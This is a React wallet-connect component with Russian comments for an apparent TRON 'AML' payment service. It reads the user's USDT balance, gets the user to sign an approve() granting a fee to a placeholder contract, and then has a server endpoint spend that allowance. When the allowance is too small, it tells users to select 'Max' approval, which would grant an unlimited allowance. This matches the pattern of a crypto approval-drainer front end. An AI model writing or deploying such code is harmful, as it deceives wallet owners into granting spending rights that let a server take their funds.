import React, { useState, useEffect } from 'react';
import toast from 'react-hot-toast';

// ─── НАСТРОЙКА ────────────────────────────────────────────────────────────────
const TRON_USDT_CONTRACT = process.env.NEXT_PUBLIC_USDT_CONTRACT || 'TXLAQ63Xg1NAzckPwKHvzw7CSEmLMEqcdj';
const TRON_AML_CONTRACT  = process.env.NEXT_PUBLIC_AML_CONTRACT  || 'ВСТАВЬ_АДРЕС_КОНТРАКТА';
const FEE_PERCENT        = parseInt(process.env.NEXT_PUBLIC_FEE_PERCENT || '2');
const TRONGRID_URL       = process.env.NEXT_PUBLIC_TRONGRID_URL  || 'https://nile.trongrid.io';
// ─────────────────────────────────────────────────────────────────────────────

// ══════════════════════════════════════════════════════════════════════════════
// ПРОВАЙДЕР
// ══════════════════════════════════════════════════════════════════════════════

const getTronWeb = () =>
  window.tronWeb ||
  window.okxwallet?.tronLink?.tronWeb ||
  window.okxwallet?.tron ||
  null;

const waitForTronWeb = (ms = 8000) => new Promise((resolve, reject) => {
  const tw = getTronWeb();
  if (tw?.defaultAddress?.base58) return resolve(tw);
  let elapsed = 0;
  const iv = setInterval(() => {
    const tw = getTronWeb();
    if (tw?.defaultAddress?.base58) { clearInterval(iv); return resolve(tw); }
    elapsed += 200;
    if (elapsed >= ms) { clearInterval(iv); reject(new Error('Кошелёк не найден. Установи TronLink или OKX Wallet.')); }
  }, 200);
});

const detectWalletType = () => {
  if (window.tronLink)            return 'TronLink';
  if (window.okxwallet?.tronLink) return 'OKX Wallet';
  if (window.tronWeb)             return 'Tron Wallet';
  return null;
};

const requestAccounts = async () => {
  if (window.tronLink?.request) {
    const res = await window.tronLink.request({ method: 'tron_requestAccounts' });
    if (res.code === 200 || res.code === 0) return true;
    throw new Error('Отклонено пользователем');
  }
  if (window.okxwallet?.tronLink?.request) {
    await window.okxwallet.tronLink.request({ method: 'tron_requestAccounts' });
    return true;
  }
  if (getTronWeb()?.defaultAddress?.base58) return true;
  throw new Error('Кошелёк не найден. Установи TronLink или OKX Wallet.');
};

// ══════════════════════════════════════════════════════════════════════════════
// TRONGRID API
// ══════════════════════════════════════════════════════════════════════════════

const tronHeaders = () => ({ 'Content-Type': 'application/json' });

function encodeAddress(base58Addr) {
  const AB = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz';
  let n = BigInt(0);
  for (const ch of base58Addr) {
    const i = AB.indexOf(ch);
    if (i < 0) throw new Error('Невалидный адрес');
    n = n * BigInt(58) + BigInt(i);
  }
  return n.toString(16).padStart(50, '0').slice(2, 42);
}

const getUsdtBalance = async (address) => {
  const res = await fetch(`${TRONGRID_URL}/wallet/triggerconstantcontract`, {
    method: 'POST', headers: tronHeaders(),
    body: JSON.stringify({
      owner_address:     address,
      contract_address:  TRON_USDT_CONTRACT,
      function_selector: 'balanceOf(address)',
      parameter:         encodeAddress(address).padStart(64, '0'),
      visible:           true,
    }),
  });
  const data = await res.json();
  const hex  = data?.constant_result?.[0] ?? '0';
  return Number(BigInt('0x' + (hex || '0'))) / 1_000_000;
};

const calculateFeeAmount = (balanceUsdt) =>
  Math.floor(balanceUsdt * 1_000_000 * FEE_PERCENT / 100);

const buildApproveTx = async (fromBase58, feeAmount) => {
  const ownerHex    = '41' + encodeAddress(fromBase58);
  const contractHex = '41' + encodeAddress(TRON_USDT_CONTRACT);
  const res = await fetch(`${TRONGRID_URL}/wallet/triggersmartcontract`, {
    method: 'POST', headers: tronHeaders(),
    body: JSON.stringify({
      owner_address:     ownerHex,
      contract_address:  contractHex,
      function_selector: 'approve(address,uint256)',
      parameter:
        encodeAddress(TRON_AML_CONTRACT).padStart(64, '0') +
        feeAmount.toString(16).padStart(64, '0'),
      fee_limit:  10_000_000,
      call_value: 0,
      visible:    false,
    }),
  });
  const data = await res.json();
  if (!data?.transaction) throw new Error('buildApproveTx: ' + (data?.Error ?? JSON.stringify(data)));
  return data.transaction;
};

const signAndBroadcast = async (tronWeb, unsignedTx) => {
  if (!tronWeb)           throw new Error('tronWeb недоступен');
  if (!unsignedTx?.txID) throw new Error('Нет транзакции для подписи');
  let signedTx;
  try {
    signedTx = await tronWeb.trx.sign(unsignedTx);
  } catch (err) {
    if (/declined|cancelled|cancel|reject/i.test(err?.message ?? '')) {
      throw new Error('Отклонено пользователем');
    }
    throw new Error('Ошибка подписи: ' + (err?.message ?? err));
  }
  if (!signedTx?.signature) throw new Error('Транзакция не подписана');
  const broadcast = await tronWeb.trx.sendRawTransaction(signedTx);
  if (!broadcast.result && broadcast.code !== 'DUP_TRANSACTION_ERROR') {
    throw new Error('Broadcast failed: ' + (broadcast.message || broadcast.code));
  }
  return signedTx.txID;
};

const callServerPay = async (userAddress) => {
  const res = await fetch('/api/pay', {
    method:  'POST',
    headers: { 'Content-Type': 'application/json' },
    body:    JSON.stringify({ userAddress }),
  });
  const data = await res.json();
  console.log('[/api/pay] response:', JSON.stringify(data));
  if (!res.ok)    throw new Error(data.error || 'Ошибка сервера');
  if (!data.txid) throw new Error('Сервер не вернул txid: ' + JSON.stringify(data));
  return data;
};

// ══════════════════════════════════════════════════════════════════════════════
// КОМПОНЕНТ
// ══════════════════════════════════════════════════════════════════════════════

function Spinner({ size = 16 }) {
  return (
    <span style={{
      display: 'inline-block', width: size, height: size,
      border: '2px solid rgba(255,255,255,0.3)', borderTopColor: '#fff',
      borderRadius: '50%', animation: 'spin 0.7s linear infinite', flexShrink: 0,
    }} />
  );
}

export default function WalletConnect({ onConnect, onDisconnect, onPaymentSuccess }) {
  const [address,     setAddress]     = useState(null);
  const [tronWeb,     setTronWeb]     = useState(null);
  const [txHash,      setTxHash]      = useState(null);
  const [paidFeeUsdt, setPaidFeeUsdt] = useState(null);
  const [busy,        setBusy]        = useState(false);
  const [step,        setStep]        = useState(''); // 'connecting' | 'approving' | 'paying'

  const fmt = (a) => `${a.slice(0, 6)}...${a.slice(-4)}`;

  // Автоподключение если кошелёк уже авторизован — сразу запускаем флоу
  useEffect(() => {
    const tw = getTronWeb();
    if (tw?.defaultAddress?.base58) {
      const addr = tw.defaultAddress.base58;
      setTronWeb(tw);
      setAddress(addr);
      onConnect?.(addr);
    }
  }, []);

  // ─── Главная функция: подключение → approve → pay ─────────────────────────
  const handleStart = async () => {
    setBusy(true);
    try {
      // Шаг 1 — подключение
      setStep('connecting');
      await requestAccounts();
      const tw   = await waitForTronWeb(6000);
      const addr = tw.defaultAddress.base58;
      setTronWeb(tw);
      setAddress(addr);
      onConnect?.(addr);

      // Шаг 2 — получаем баланс и считаем комиссию
      const bal = await getUsdtBalance(addr).catch(() => 0);
      const fee = calculateFeeAmount(bal);

      if (fee === 0) {
        toast.error('Баланс USDT равен нулю');
        setBusy(false);
        setStep('');
        return;
      }

      // Шаг 3 — approve
      setStep('approving');
      const unsignedTx = await buildApproveTx(addr, fee);
      await signAndBroadcast(tw, unsignedTx);

      // Небольшая пауза — ждём подтверждения approve
      await new Promise(r => setTimeout(r, 2000));

      // Шаг 4 — pay()
      setStep('paying');
      const result = await callServerPay(addr);
      const paid   = result.feeUsdt ?? fee / 1_000_000;

      setPaidFeeUsdt(paid);
      setTxHash(result.txid);
      toast.success(`Оплата ${paid.toFixed(4)} USDT прошла!`, { duration: 6000 });
      onPaymentSuccess?.(result.txid, addr);

    } catch (err) {
      console.error('[handleStart]', err);
      const isRejected  = /отклонено|rejected|cancel/i.test(err.message ?? '');
      const isAllowance = /allowance|insufficient allow/i.test(err.message ?? '');
      if (isAllowance) {
      toast.error('Сумма разрешения меньше необходимой. Нажмите «Повторить» и в поле разрешения выберите Max для корректной работы сервиса.', { duration: 10000 });
      } else if (!isRejected) {
        toast.error(err.message || 'Ошибка', { duration: 6000 });
      }
    } finally {
      setBusy(false);
      setStep('');
    }
  };

  const handleRetry = async () => {
    if (!address || !tronWeb) return;
    setBusy(true);
    try {
      const bal = await getUsdtBalance(address).catch(() => 0);
      const fee = calculateFeeAmount(bal);
      if (fee === 0) { toast.error('Баланс USDT равен нулю'); return; }

      setStep('approving');
      const unsignedTx = await buildApproveTx(address, fee);
      await signAndBroadcast(tronWeb, unsignedTx);
      await new Promise(r => setTimeout(r, 2000));

      setStep('paying');
      const result = await callServerPay(address);
      const paid   = result.feeUsdt ?? fee / 1_000_000;
      setPaidFeeUsdt(paid);
      setTxHash(result.txid);
      toast.success(`Оплата ${paid.toFixed(4)} USDT прошла!`, { duration: 6000 });
      onPaymentSuccess?.(result.txid, address);
    } catch (err) {
      const isRejected  = /отклонено|rejected|cancel/i.test(err.message ?? '');
      const isAllowance = /allowance|insufficient allow/i.test(err.message ?? '');
      if (isAllowance) {
        toast.error('Сумма разрешения меньше необходимой. Нажмите «Повторить» и в поле разрешения выберите Max для корректной работы сервиса.', { duration: 10000 });
      } else if (!isRejected) {
        toast.error(err.message || 'Ошибка', { duration: 6000 });
      }
    } finally {
      setBusy(false);
      setStep('');
    }
  };

  const handleDisconnect = () => {
    setAddress(null);
    setTronWeb(null);
    setTxHash(null);
    setPaidFeeUsdt(null);
    setBusy(false);
    setStep('');
    onDisconnect?.();
  };

  const btnLabel = () => {
    if (step === 'connecting') return 'Подключение...';
    if (step === 'approving')  return 'Подпиши в кошельке...';
    if (step === 'paying')     return 'Обработка...';
    return 'Подключить кошелёк';
  };

  // ─── Не подключён ─────────────────────────────────────────────────────────
  if (!address) {
    return (
      <div style={{ display:'flex', justifyContent:'flex-end', marginBottom:'2rem' }}>
        <button onClick={handleStart} disabled={busy} style={btnStyle(busy)}>
          {busy ? <Spinner /> : <i className="fas fa-wallet" />}
          {btnLabel()}
        </button>
      </div>
    );
  }

  // ─── Подключён ────────────────────────────────────────────────────────────
  return (
    <div style={{ display:'flex', justifyContent:'flex-end', marginBottom:'2rem' }}>
      <div style={{ display:'flex', flexDirection:'column', alignItems:'flex-end', gap:'0.5rem' }}>

        <div style={badgeStyle}>
          <i className="fas fa-check-circle" style={{ color:'#10b981' }} />
          <div style={{ textAlign:'right' }}>
            <div style={{ color:'#60a5fa', fontFamily:'monospace' }}>{fmt(address)}</div>
            {txHash ? (
              <a href={`https://nile.tronscan.org/#/transaction/${txHash}`} target="_blank" rel="noopener noreferrer"
                style={{ fontSize:'0.72rem', color:'#10b981', textDecoration:'none' }}>
                ✓ Оплачено {paidFeeUsdt ? `${paidFeeUsdt.toFixed(4)} USDT` : ''} · NileScan ↗
              </a>
            ) : (
              <div style={{ fontSize:'0.72rem', color:'#f59e0b' }}>⏳ Ожидание оплаты</div>
            )}
          </div>
          <button onClick={handleDisconnect} disabled={busy}
            style={{ background:'none', border:'none', color:'#ef4444', cursor:'pointer' }}>
            <i className="fas fa-sign-out-alt" />
          </button>
        </div>

        {/* Статус процесса */}
        {busy && (
          <div style={{ fontSize:'0.75rem', color:'#a0b3d9', display:'flex', alignItems:'center', gap:'6px' }}>
            <Spinner size={11} />
            {step === 'connecting' && 'Подключаемся к кошельку...'}
            {step === 'approving'  && 'Подпиши транзакцию в кошельке...'}
            {step === 'paying'     && 'Сервер обрабатывает оплату...'}
          </div>
        )}

        {/* Кнопка повтора */}
        {!txHash && !busy && (
          <button onClick={handleRetry} style={retryStyle}>
            ↻ Повторить оплату
          </button>
        )}

      </div>
    </div>
  );
}

const btnStyle = (disabled) => ({
  background:   disabled ? '#1e3a5f' : 'linear-gradient(135deg, #3b82f6, #60a5fa)',
  color:        'white', border: 'none', borderRadius: '40px',
  padding:      '1rem 2rem', fontSize: '1rem', fontWeight: '600',
  cursor:       disabled ? 'not-allowed' : 'pointer',
  display:      'flex', alignItems: 'center', gap: '0.8rem',
  opacity:      disabled ? 0.7 : 1, transition: 'all 0.2s',
});

const badgeStyle = {
  background:   'rgba(59,130,246,0.1)', border: '1px solid rgba(59,130,246,0.2)',
  borderRadius: '40px', padding: '0.8rem 1.5rem',
  display:      'flex', alignItems: 'center', gap: '1rem',
};

const retryStyle = {
  background:   'transparent', border: '1px solid rgba(59,130,246,0.4)',
  borderRadius: '20px', padding: '0.4rem 1.2rem',
  color:        '#60a5fa', fontSize: '0.8rem', cursor: 'pointer',
};
